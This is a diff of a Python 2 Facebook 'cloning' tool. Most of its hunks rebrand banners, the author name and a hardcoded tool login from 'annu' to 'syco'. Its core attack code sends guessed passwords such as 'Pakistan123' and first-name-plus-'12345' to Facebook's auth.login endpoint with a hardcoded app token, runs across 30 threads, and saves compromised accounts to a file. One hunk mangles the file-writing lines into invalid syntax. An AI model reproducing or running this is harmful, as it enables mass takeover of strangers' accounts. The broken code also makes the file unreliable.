@@ -48,8 +48,8 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """ ▄︻┻═┳一 ЩєLc๏Mє ┼๏ ┼ђє Fąş┼єş┼ єVєr cL๏ЙIЙG
-           ▄︻┻═┳一 ♥️annu-tricker๏FFIcIąL♥️----------🔴
-           ▄︻┻═┳一 ♥️♥️ annu - cL๏Йєr  ♥️♥️----🔴🔴
+           ▄︻┻═┳一 ♥️syco-tricker๏FFIcIąL♥️----------🔴
+           ▄︻┻═┳一 ♥️♥️ syco - cL๏Йєr  ♥️♥️----🔴🔴
            ▄︻┻═┳一    💪💪PAPPU-BACHi💪💪   🔴🔴
            ▄︻┻═┳一 ---- FєєL ┼ђє P๏Щєr   --------🔴🔴
 	          ЩєLc๏Mє ┼๏ ЦЙLIMI┼єđ cL๏ЙIЙG
@@ -57,7 +57,7 @@ logo = """ ▄︻┻═┳一 ЩєLc๏Mє ┼๏ ┼ђє Fąş┼єş┼ єVєr
       ░  ░🇦🇳🇳🇺 🇹🇷🇮🇨🇰🇪🇷
                                                  
                WhatsApp: 0014406281533
-                       its annu tricker
+                       its syco tricker
                      ▇◤▔▔▔▔▔▔▔◥▇
                      ▇▏◥▇◣┊◢▇◤▕▇
                      ▇▏▃▆▅▎▅▆▃▕▇
@@ -74,8 +74,8 @@ logo = """ ▄︻┻═┳一 ЩєLc๏Mє ┼๏ ┼ђє Fąş┼єş┼ єVєr
 \033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mtechnical kuri
 \033[1;96mInstagram \033[1;93m: \033[1: technical cyber
-\033[1;96mFacebook  \033[1;93m: \033[1: tricky kuri
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/abicreation/annu
+\033[1;96mFacebook  \033[1;93m: \033[1: syco tricker
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/abicreation
 \033[1;91m======================================="""
 
 def tik():
@@ -98,7 +98,7 @@ print "\033[1;96m ============================================================="
 print  """\033[1;91m
     ░  ░ 🇦🇳🇳🇺 🇹🇷🇮🇨🇰🇪🇷 hacker
 ░  ░       ░ ░         ░     
-                       annu
+                       SYCO
                      ▇◤▔▔▔▔▔▔▔◥▇
                      ▇▏◥▇◣┊◢▇◤▕▇
                      ▇▏▃▆▅▎▅▆▃▕▇
@@ -108,15 +108,15 @@ print  """\033[1;91m
                      ▇▇▇◣╲▇╱◢▇▇▇
                      ▇▇▇▇◣▇◢▇▇▇▇
                    WhatsApp : 0014406281533
-\033[1;96mAuthor  \033[1;93m: \033[1;92mannu tricker
+\033[1;96mAuthor  \033[1;93m: \033[1;92mSYCO tricker
 \033[1;96mInstagram \033[1;93m: \033[1;92mtechnical cyber
-\033[1;96mFacebook  \033[1;93m: \033[1;92m tricky kuri
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/abicreation/annu
+\033[1;96mFacebook  \033[1;93m: \033[1;92m Syco Tricker
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/abicreation
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "annu"
-CorrectPassword = "annu"
+CorrectUsername = "syco"
+CorrectPassword = "syco"
 
 loop = 'true'
 while (loop == 'true'):
@@ -330,7 +330,7 @@ def pilih_super():
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
-			pass1 = ('786786')
+			pass1 = ('Pakistan123')
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -339,9 +339,9 @@ def pilih_super():
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
 					print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
-					cek = open("out/checkpoint.txt", "a")
-					cek.write(user+"|"+pass1+"\n")
-					cek.close()
+					 = open("out/checkpoint.txt", "a")
+					(user+"|"+pass1+"\n")
+					.close()
 					cekpoint.append(user+pass1)
 				else:
 					pass2 = b['first_name']+'12345'
@@ -437,7 +437,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed Annu says Thank You♥️ \033[1;97m....'
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed Syco says Thank You♥️ \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92mTHANKS FOR USING MY COMMANDS ! WE WILL BE RIGHT BACK \033[1;91m: \033[1;97mout/checkpoint.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
